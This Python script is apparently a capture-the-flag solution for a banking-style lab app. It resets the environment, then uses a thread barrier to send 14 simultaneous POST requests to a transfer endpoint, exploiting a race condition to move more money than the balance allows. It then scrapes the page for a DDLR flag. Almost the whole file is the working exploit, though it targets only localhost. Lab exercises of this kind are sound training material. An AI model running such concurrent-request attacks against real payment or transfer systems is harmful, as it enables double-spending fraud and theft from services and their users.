#!/usr/bin/env python3
import re
import time
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from threading import Barrier

BASE_URL = "http://localhost:8080"
WORKERS = 14
AMOUNT = 100

barrier = Barrier(WORKERS)


def post_transfer(_):
    data = urllib.parse.urlencode({
        "amount": str(AMOUNT),
        "concept": "Movimiento interno",
        "destination_alias": "vault.reserve@hackl4bs",
    }).encode()

    req = urllib.request.Request(
        f"{BASE_URL}/transferencia.php",
        data=data,
        method="POST",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "vault-client/2026",
        },
    )

    barrier.wait()

    try:
        with urllib.request.urlopen(req, timeout=8) as response:
            return response.status
    except Exception as exc:
        return f"ERR: {exc}"


def post_reset():
    req = urllib.request.Request(f"{BASE_URL}/reset.php", data=b"", method="POST")
    try:
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


def get_page(path="/"):
    with urllib.request.urlopen(f"{BASE_URL}{path}", timeout=8) as response:
        return response.read().decode("utf-8", errors="ignore")


def main():
    print("[*] Reseteando entorno...")
    post_reset()
    time.sleep(0.5)

    print(f"[*] Enviando {WORKERS} transferencias simultáneas...")
    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        results = list(executor.map(post_transfer, range(WORKERS)))

    print("[*] Respuestas:", results)

    print("[*] Consultando portal...")
    html = get_page("/")
    estado = get_page("/estado.php")

    flag = re.search(r"DDLR\{[^<\s]+}", html)
    code = re.search(r"<code>([^<]+)</code>", html)
    unlocked = "Alerta de conciliación" in html

    if flag:
        print("[+] FLAG:", flag.group(0))
    elif code and unlocked:
        print("[+] Código visible:", code.group(1))
        print("[!] El reto se desbloqueó, pero no hay una flag DDLR real configurada.")
        print("[!] Revisá CTF_FLAG en docker-compose.yml o montá private/flag.txt en el despliegue.")
    elif unlocked:
        print("[+] Se desbloqueó la alerta de conciliación, pero no pude extraer el código.")
        print("[*] Estado:", estado)
    else:
        print("[-] No salió la flag todavía.")
        print("[*] Probá subir WORKERS o ejecutarlo otra vez.")
        print("[*] Estado:", estado)


if __name__ == "__main__":
    main()
